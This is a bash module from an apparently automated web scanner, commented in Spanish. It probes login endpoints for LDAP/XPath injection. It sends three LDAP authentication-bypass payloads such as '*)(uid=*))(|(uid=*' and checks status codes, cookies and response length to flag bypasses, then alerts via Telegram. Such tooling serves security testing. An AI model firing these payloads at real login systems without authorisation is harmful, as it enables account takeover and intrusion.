#!/usr/bin/env bash
# modules/53_ldap_xpath.sh — Tier 3.7 LDAP/XPath injection en login + search
MODULE_NAME="ldap_xpath"
MODULE_DESC="LDAP/XPath injection — auth bypass + search filter manipulation"

_li_finding() {
  db_add_finding "$1" "ldap_xpath" "$5" "$3" "$4" "$6" "${7:-medium}" 2>/dev/null
  log_warn "  ⚡ [$5/${7:-medium}] LDAP/XPath $4: $3"
  if [[ "${7:-medium}" != "low" ]] && [[ "$5" == "critical" || "$5" == "high" ]]; then
    _telegram_send "🔴 *LDAP/XPath — $4*
🌐 \`$2\`
🔗 \`$3\`
📋 ${6:0:280}
📊 \`${5^^}\` / \`${7:-medium}\`" 2>/dev/null || true
  fi
}

_li_probe() {
  local URL="$1" DOMAIN_ID="$2" DOMAIN="$3"
  # LDAP auth bypass payloads
  local LDAP_PAYLOADS=(
    'username=*)(uid=*))(|(uid=*&password=anything'
    'username=admin)(&(password=*))&password=anything'
    'username=*&password=*'
  )
  # Baseline: invalid creds
  local BASELINE_BODY='{"username":"hackeadora_invalid","password":"invalid"}'
  _h_post_noredirect "$URL" "$BASELINE_BODY" --connect-timeout 8 -H "Content-Type: application/json"
  local BASELINE_STATUS="$HTTP_LAST_STATUS"
  local BASELINE_LEN=${#HTTP_LAST_BODY}
  local BASELINE_COOKIES; BASELINE_COOKIES=$(echo "$HTTP_LAST_HEADERS" | grep -ci "^set-cookie:")

  for PAYLOAD in "${LDAP_PAYLOADS[@]}"; do
    _h_post_noredirect "$URL" "$PAYLOAD" --connect-timeout 8 \
      -H "Content-Type: application/x-www-form-urlencoded"
    local STATUS="$HTTP_LAST_STATUS"
    local LEN=${#HTTP_LAST_BODY}
    local COOKIES; COOKIES=$(echo "$HTTP_LAST_HEADERS" | grep -ci "^set-cookie:")
    local BODY="${HTTP_LAST_BODY:0:1500}"

    # Auth bypass: status 200 + cookies set + body sin error
    if [[ "$STATUS" == "200" ]] && [[ "$COOKIES" -gt "$BASELINE_COOKIES" ]]; then
      if ! echo "$BODY" | grep -qiE '"error"|"invalid"|"failed"|"incorrect"'; then
        _li_finding "$DOMAIN_ID" "$DOMAIN" "$URL" "ldap_auth_bypass" "critical" \
          "LDAP injection auth bypass: payload '*)(uid=*))(|(uid=*' acepta como válido — backend LDAP filter no escape input. Status $STATUS, cookies++. " \
          "high"
        return 0
      fi
    fi
    # Diff de length significativo (>30%) → posible LDAP filter manipulation
    if [[ "$BASELINE_LEN" -gt 100 ]] && [[ "$LEN" -gt 100 ]]; then
      local DIFF=$(( LEN - BASELINE_LEN ))
      [[ $DIFF -lt 0 ]] && DIFF=$(( -DIFF ))
      local THRESHOLD=$(( BASELINE_LEN / 3 ))
      if [[ $DIFF -gt $THRESHOLD ]]; then
        _li_finding "$DOMAIN_ID" "$DOMAIN" "$URL" "ldap_filter_diff" "medium" \
          "LDAP/XPath filter manipulation: payload '$PAYLOAD' cambia tamaño respuesta significativamente (${BASELINE_LEN} → ${LEN}). Verificar filter behavior manual." \
          "medium"
      fi
    fi
  done
  return 1
}

module_run() {
  local DOMAIN="$1" DOMAIN_ID="$2" OUT_DIR="$3"
  log_phase "Módulo 53 — $MODULE_DESC: $DOMAIN"
  source "${SCRIPT_DIR}/core/http_analyzer.sh" 2>/dev/null
  local CANDIDATES
  CANDIDATES=$(sqlite3 "$DB_PATH" "
    SELECT DISTINCT url FROM urls
    WHERE domain_id=${DOMAIN_ID}
      AND (url LIKE '%/login%' OR url LIKE '%/auth%' OR url LIKE '%/signin%')
      AND url NOT LIKE '%.css%' AND url NOT LIKE '%.js%'
    LIMIT 10;" 2>/dev/null | sort -u)
  [[ -z "$CANDIDATES" ]] && { log_info "  Sin login endpoints"; return 0; }
  local TOTAL=0
  while IFS= read -r URL; do
    [[ -z "$URL" ]] && continue
    _li_probe "${URL%%\?*}" "$DOMAIN_ID" "$DOMAIN" && ((TOTAL++))
  done <<< "$CANDIDATES"
  log_ok "$MODULE_DESC: $TOTAL"
}
